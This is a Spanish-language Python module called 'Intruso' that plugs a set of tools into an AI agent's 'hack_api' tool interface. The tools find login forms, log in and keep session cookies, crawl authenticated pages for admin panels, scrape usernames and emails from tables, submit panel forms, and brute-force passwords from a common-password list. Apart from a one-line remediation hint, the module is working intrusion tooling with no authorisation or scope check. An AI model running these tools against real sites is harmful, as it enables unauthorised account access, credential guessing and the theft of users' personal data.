"""Intruso: entra de verdad, navega lo autenticado y saca datos.

Comparte la sesion con galletas de hack_api (mismas cookies por chat).
Solo Python puro: sirve en Vercel y Termux.
"""
import re, time
from urllib.parse import urljoin, urlparse, urlencode
import hack_api as H

MAX_PAG, MAX_PROF, MAX_FILAS, MAX_CLAVES, MAX_EST = 30, 3, 60, 40, 40
_EST = {}
CAMPOS_USUARIO = ('alias', 'email', 'correo', 'usuario', 'user', 'username', 'login',
                  'documento', 'cedula', 'identificacion', 'nick', 'mail')
PISTAS_DENTRO = ('cerrar sesion', 'cerrar sesión', 'logout', 'salir', 'mi perfil',
                 'dashboard', 'panel', 'bienvenid', 'mis datos', 'mi cuenta')
PISTAS_ADMIN = ('admin', 'usuarios', 'users', 'panel', 'dashboard', 'config',
                'roles', 'reportes', 'clientes', 'cuentas', 'seguridad', 'permisos')
ESTATICO = ('.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.gif', '.ico',
            '.woff', '.woff2', '.pdf', '.zip', '.mp4')

def _base(u):
    p = urlparse(u)
    return f'{p.scheme}://{p.netloc}'

def _mismo(a, b):
    try:
        return urlparse(a).hostname == urlparse(b).hostname
    except Exception:
        return False

def _est():
    k = H._chat()
    if k not in _EST:
        if len(_EST) >= MAX_EST:
            _EST.pop(next(iter(_EST)), None)
        _EST[k] = {'base': '', 'usuario': '', 'autenticado': False, 'vistas': {}}
    return _EST[k]

def _autenticado(r):
    if r is None:
        return False
    bajo = (r.text or '')[:9000].lower()
    if re.search(r'type=["\']password', bajo):
        return False
    return any(p in bajo for p in PISTAS_DENTRO)

def _inputs(bloque):
    out = []
    for m in re.findall(r'<input[^>]*>', bloque or '', re.I):
        n = re.search(r'name=["\']([^"\']+)', m, re.I)
        if not n:
            continue
        ti = re.search(r'type=["\']([^"\']+)', m, re.I)
        v = re.search(r'value=["\']([^"\']*)', m, re.I)
        out.append((n.group(1), (ti.group(1) if ti else 'text').lower(), v.group(1) if v else ''))
    return out

def _attrs(bloque):
    a = re.search(r'action=["\']([^"\']*)', bloque or '', re.I)
    m = re.search(r'method=["\']([^"\']*)', bloque or '', re.I)
    return (a.group(1) if a else ''), ((m.group(1) if m else 'POST').upper())

def _enlaces(texto, base):
    out, vistos = [], set()
    for h in re.findall(r'<a[^>]+href=["\']([^"\']+)', texto or '', re.I):
        if h.startswith(('#', 'mailto:', 'tel:', 'javascript:')):
            continue
        x = urljoin(base, h).split('#')[0]
        if not x.startswith('http') or not _mismo(x, base):
            continue
        if x.lower().endswith(ESTATICO) or x in vistos:
            continue
        vistos.add(x)
        out.append(x)
    return out

def _tablas(texto):
    out = []
    for t in re.findall(r'<table[^>]*>.*?</table>', texto or '', re.I | re.S)[:5]:
        cab = [re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', '', c)).strip()
               for c in re.findall(r'<th[^>]*>.*?</th>', t, re.I | re.S)][:12]
        filas = []
        for tr in re.findall(r'<tr[^>]*>.*?</tr>', t, re.I | re.S)[:MAX_FILAS]:
            celdas = [re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', '', c)).strip()
                      for c in re.findall(r'<td[^>]*>.*?</td>', tr, re.I | re.S)][:12]
            if celdas:
                filas.append(celdas)
        if filas:
            out.append({'cabeceras': cab, 'filas': filas})
    return out

def _siguiente(texto, base):
    m = re.search(r'<a[^>]+rel=["\']next["\'][^>]*href=["\']([^"\']+)', texto or '', re.I)
    if not m:
        m = re.search(r'<a[^>]+href=["\']([^"\']*(?:page|pagina|pag|offset|start)=\d+[^"\']*)',
                      texto or '', re.I)
    return urljoin(base, m.group(1)) if m else ''

def detectar_login(url):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    r, err = H._pedir(u)
    if err:
        return err
    t = r.text or ''
    bloques = re.findall(r'<form[^>]*>.*?</form>', t, re.I | re.S)
    elegido = ''
    for b in bloques:
        if re.search(r'type=["\']password', b, re.I):
            elegido = b
            break
    if not elegido:
        if re.search(r'type=["\']password', t, re.I):
            elegido = t
        else:
            return {'ok': False, 'error': 'no hay campo de clave en esa pagina',
                    'formularios': H._forms(t)[:6],
                    'pista': 'Pasa la URL exacta del login o usa entrar con campo_usuario y campo_clave.'}
    accion, metodo = _attrs(elegido)
    campos = _inputs(elegido)
    usuario = ''
    for nombre, tipo, _v in campos:
        if tipo in ('text', 'email', 'tel') and any(c in nombre.lower() for c in CAMPOS_USUARIO):
            usuario = nombre
            break
    if not usuario:
        for nombre, tipo, _v in campos:
            if tipo in ('text', 'email', 'tel'):
                usuario = nombre
                break
    clave = ''
    for nombre, tipo, _v in campos:
        if tipo == 'password':
            clave = nombre
            break
    ocultos = {n: v for n, tp, v in campos if tp == 'hidden'}
    return {'ok': bool(usuario and clave), 'accion': urljoin(u, accion or ''),
            'metodo': metodo, 'usuario': usuario, 'clave': clave, 'ocultos': ocultos,
            'csrf': bool(ocultos),
            'error': '' if (usuario and clave) else 'no identifique los campos de usuario y clave'}

def entrar(url, usuario, clave, campo_usuario=None, campo_clave=None,
           metodo=None, campo_extra=None):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    if not usuario or not clave:
        return {'ok': False, 'error': 'hacen falta usuario y clave'}
    d = detectar_login(u)
    if not d.get('ok') and not (campo_usuario and campo_clave):
        return d
    accion = d.get('accion') or u
    met = (metodo or d.get('metodo') or 'POST').upper()
    cu = campo_usuario or d.get('usuario')
    cc = campo_clave or d.get('clave')
    if not cu or not cc:
        return {'ok': False, 'error': 'no supe que campos son', 'detectado': d}
    datos = dict(d.get('ocultos') or {})
    for par in str(campo_extra or '').split(','):
        if '=' in par:
            k, v = par.split('=', 1)
            datos[k.strip()] = v.strip()
    datos[cu] = usuario
    datos[cc] = clave
    r, err = H._pedir(accion, met,
                      {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': u},
                      urlencode(datos))
    if err:
        return err
    if _autenticado(r):
        _est().update({'base': _base(u), 'usuario': usuario, 'autenticado': True})
        H._anotar('Sesion abierta', 'alta', u, 'entro como ' + usuario, r.url)
        return {'ok': True, 'dentro': True, 'url_final': r.url, 'status': r.status_code,
                'galletas': [c.name for c in H._sesion().cookies],
                'enlaces': _enlaces(r.text, r.url)[:15],
                'nota': 'Dentro. Ahora usa navegar y sacar_usuarios.'}
    return {'ok': False, 'error': 'no entro: rechazo o campos equivocados',
            'url_final': r.url, 'status': r.status_code, 'muestra': H._recorte(r.text, 500)}

def navegar(url=None, profundidad=1, limite=20):
    est = _est()
    ini = H._norm(url) or est.get('base') or ''
    if not ini:
        return {'ok': False, 'error': 'falta la URL o abre sesion primero'}
    prof = max(0, min(int(profundidad or 1), MAX_PROF))
    tope = max(1, min(int(limite or 20), MAX_PAG))
    cola, vistas = [(ini, 0)], set()
    paginas, forms, tablas, interes = [], [], [], []
    while cola and len(vistas) < tope:
        actual, n = cola.pop(0)
        if actual in vistas:
            continue
        vistas.add(actual)
        r, err = H._pedir(actual)
        if err or r is None:
            continue
        if not _autenticado(r):
            if actual == ini:
                return {'ok': False, 'error': 'la sesion no esta viva: cayo al login', 'url': actual}
            continue
        t = r.text or ''
        f, tb = H._forms(t), _tablas(t)
        paginas.append({'url': r.url, 'status': r.status_code, 'titulo': H._titulo(t),
                        'largo': len(t), 'formularios': len(f),
                        'filas': sum(len(x['filas']) for x in tb)})
        if f:
            forms.append({'url': r.url, 'formularios': f})
        if tb:
            tablas.append({'url': r.url, 'tablas': tb})
        if any(p in (r.url + ' ' + H._titulo(t)).lower() for p in PISTAS_ADMIN):
            interes.append(r.url)
        est['vistas'][r.url] = {'status': r.status_code, 'titulo': H._titulo(t)}
        if n < prof:
            for e in _enlaces(t, r.url)[:25]:
                if e not in vistas:
                    cola.append((e, n + 1))
    if interes:
        H._anotar('Panel autenticado encontrado', 'media', interes[0], ', '.join(interes[:8]))
    return {'ok': True, 'revisadas': len(vistas), 'paginas': paginas,
            'formularios': forms[:10], 'tablas': tablas[:10], 'interesantes': interes[:15],
            'nota': 'interesantes = paneles de admin o usuarios. Sigue con sacar_usuarios.'}

def sacar_usuarios(url, max_filas=40, paginar=True):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    tope = max(1, min(int(max_filas or 40), MAX_FILAS))
    vistos, salida, correos = set(), [], set()
    actual, paginas = u, 0
    while actual and paginas < 5 and len(salida) < tope:
        r, err = H._pedir(actual)
        if err:
            return err
        t = r.text or ''
        paginas += 1
        for tb in _tablas(t):
            cab = [c.lower() for c in tb['cabeceras']]
            idx = [i for i, c in enumerate(cab) if any(k in c for k in
                   ('usuario', 'user', 'correo', 'email', 'mail', 'nombre',
                    'documento', 'cedula', 'identificacion'))]
            for fila in tb['filas']:
                if len(salida) >= tope:
                    break
                reg = {'cabeceras': tb['cabeceras'], 'fila': fila}
                if idx:
                    reg['clave'] = ' | '.join(fila[i] for i in idx if i < len(fila))
                if reg.get('clave') and reg['clave'] not in vistos:
                    vistos.add(reg['clave'])
                    salida.append(reg)
        correos |= set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.]{2,}', t))
        if not paginar:
            break
        sig = _siguiente(t, r.url)
        if not sig or sig == actual:
            break
        actual = sig
    if salida or correos:
        H._anotar('Listado de usuarios expuesto', 'alta', u,
                  f'{len(salida)} filas y {len(correos)} correos',
                  ', '.join(sorted(correos)[:3]))
    return {'ok': True, 'url': u, 'paginas': paginas, 'filas': salida[:tope],
            'correos': sorted(correos)[:60], 'total_filas': len(salida),
            'nota': 'Si esto sale igual sin sesion, es exposicion directa.'}

def enviar_formulario(url, datos, metodo='POST', campo_extra=None):
    u = H._norm(url)
    if not u:
        return {'ok': False, 'error': 'URL invalida'}
    r0, err = H._pedir(u)
    if err:
        return err
    cuerpo = dict(H._ocultos(r0.text or ''))
    for bloque in (datos, campo_extra):
        for par in str(bloque or '').split(','):
            if '=' in par:
                k, v = par.split('=', 1)
                cuerpo[k.strip()] = v.strip()
    if not cuerpo:
        return {'ok': False, 'error': 'faltan datos (k=v separados por comas)'}
    r, err = H._pedir(u, metodo,
                      {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': u},
                      urlencode(cuerpo))
    if err:
        return err
    return {'ok': r.status_code < 400, 'status': r.status_code, 'url_final': r.url,
            'enviado': list(cuerpo)[:15], 'muestra': H._recorte(r.text, 600),
            'nota': 'Los ocultos (CSRF) se tomaron solos de la pagina.'}

def probar_claves(url, usuario, limite=25, pausa=0.4):
    u = H._norm(url)
    if not u or not usuario:
        return {'ok': False, 'error': 'hacen faltan url y usuario'}
    d = detectar_login(u)
    if not d.get('ok'):
        return d
    tope = max(1, min(int(limite or 25), MAX_CLAVES))
    t0, probadas = time.time(), 0
    for clave in H.CLAVES_COMUNES[:tope]:
        res = entrar(u, usuario, clave, d.get('usuario'), d.get('clave'), d.get('metodo'))
        probadas += 1
        if res.get('ok'):
            H._anotar('Clave debil', 'alta', u, f'{usuario}:{clave}', '')
            return {'ok': True, 'encontrada': clave, 'usuario': usuario,
                    'probadas': probadas, 'segundos': round(time.time() - t0, 1),
                    'nota': 'Entra con esa. Cambiala y pon bloqueo por intentos.'}
        time.sleep(float(pausa))
    return {'ok': True, 'encontrada': '', 'probadas': probadas,
            'segundos': round(time.time() - t0, 1),
            'nota': 'No estaba en la lista tipica.'}

def peticion_auth(url, metodo='GET', cabeceras=None, cuerpo=None):
    r, err = H._pedir(url, metodo, cabeceras, cuerpo)
    if err:
        return err
    return {'ok': True, 'autenticado': _autenticado(r), 'status': r.status_code,
            'url_final': r.url, 'cuerpo': H._recorte(r.text),
            'nota': 'autenticado=false = esa ruta te devolvio el login.'}

def mapa():
    est = _est()
    return {'ok': True, 'base': est.get('base'), 'usuario': est.get('usuario'),
            'autenticado': est.get('autenticado'),
            'vistas': list(est.get('vistas').keys())[-40:]}

NOMBRES = ('detectar_login', 'entrar', 'navegar', 'sacar_usuarios',
           'enviar_formulario', 'probar_claves', 'peticion_auth', 'mapa')

def _e(n, d, props, req=()):
    return {'name': n, 'description': d,
            'parameters': {'type': 'object', 'properties': props, 'required': list(req)}}

HERRAMIENTAS = [
    _e('detectar_login', 'Busca el formulario de login y saca los nombres reales de los campos '
       'y el token CSRF. Paso previo a entrar.', {'url': {'type': 'string'}}, ('url',)),
    _e('entrar', 'Inicia sesion de verdad y confirma con la respuesta si quedo dentro. Guarda '
       'galletas para lo siguiente.', {'url': {'type': 'string'}, 'usuario': {'type': 'string'},
       'clave': {'type': 'string'}, 'campo_usuario': {'type': 'string'},
       'campo_clave': {'type': 'string'}, 'metodo': {'type': 'string'},
       'campo_extra': {'type': 'string'}}, ('url', 'usuario', 'clave')),
    _e('navegar', 'Camina las paginas con la sesion abierta, lista formularios, tablas y paneles '
       'de administracion.', {'url': {'type': 'string'}, 'profundidad': {'type': 'integer'},
       'limite': {'type': 'integer'}}, ()),
    _e('sacar_usuarios', 'Extrae usuarios, correos y filas de las tablas del panel, paginando.',
       {'url': {'type': 'string'}, 'max_filas': {'type': 'integer'},
        'paginar': {'type': 'boolean'}}, ('url',)),
    _e('enviar_formulario', 'Envia un formulario del panel (crear, editar, asignar).',
       {'url': {'type': 'string'}, 'datos': {'type': 'string'},
        'metodo': {'type': 'string'}, 'campo_extra': {'type': 'string'}}, ('url', 'datos')),
    _e('probar_claves', 'Prueba claves tipicas contra un login ya detectado.',
       {'url': {'type': 'string'}, 'usuario': {'type': 'string'},
        'limite': {'type': 'integer'}}, ('url', 'usuario')),
    _e('peticion_auth', 'Peticion con la sesion y te dice si la ruta te devolvio el login.',
       {'url': {'type': 'string'}, 'metodo': {'type': 'string'},
        'cabeceras': {'type': 'object'}, 'cuerpo': {'type': 'string'}}, ('url',)),
    _e('mapa', 'Estado de la sesion: usuario, base y paginas ya vistas.', {}, ()),
]

def _despachar(nombre, a):
    if nombre == 'detectar_login':
        return detectar_login(a.get('url'))
    if nombre == 'entrar':
        return entrar(a.get('url'), a.get('usuario'), a.get('clave'), a.get('campo_usuario'),
                      a.get('campo_clave'), a.get('metodo'), a.get('campo_extra'))
    if nombre == 'navegar':
        return navegar(a.get('url'), a.get('profundidad') or 1, a.get('limite') or 20)
    if nombre == 'sacar_usuarios':
        return sacar_usuarios(a.get('url'), a.get('max_filas') or 40, a.get('paginar', True))
    if nombre == 'enviar_formulario':
        return enviar_formulario(a.get('url'), a.get('datos'), a.get('metodo') or 'POST',
                                 a.get('campo_extra'))
    if nombre == 'probar_claves':
        return probar_claves(a.get('url'), a.get('usuario'), a.get('limite') or 25)
    if nombre == 'peticion_auth':
        return peticion_auth(a.get('url'), a.get('metodo') or 'GET', a.get('cabeceras'),
                             a.get('cuerpo'))
    if nombre == 'mapa':
        return mapa()
    return {'ok': False, 'error': 'desconocida: ' + str(nombre)}

def herramienta(nombre, args):
    a = args if isinstance(args, dict) else {}
    try:
        return _despachar(nombre, a)
    except Exception as e:
        print('[INTRUSO]', e)
        return {'ok': False, 'error': 'fallo: ' + str(e)[:150]}

# Enganche: se suman a hack_api para no tocar el resto de server.py
H.NOMBRES = tuple(H.NOMBRES) + NOMBRES
H.HERRAMIENTAS.extend(HERRAMIENTAS)
_ORIGINAL = H.herramienta

def _gancho(nombre, args):
    if nombre in NOMBRES:
        return herramienta(nombre, args)
    return _ORIGINAL(nombre, args)

H.herramienta = _gancho
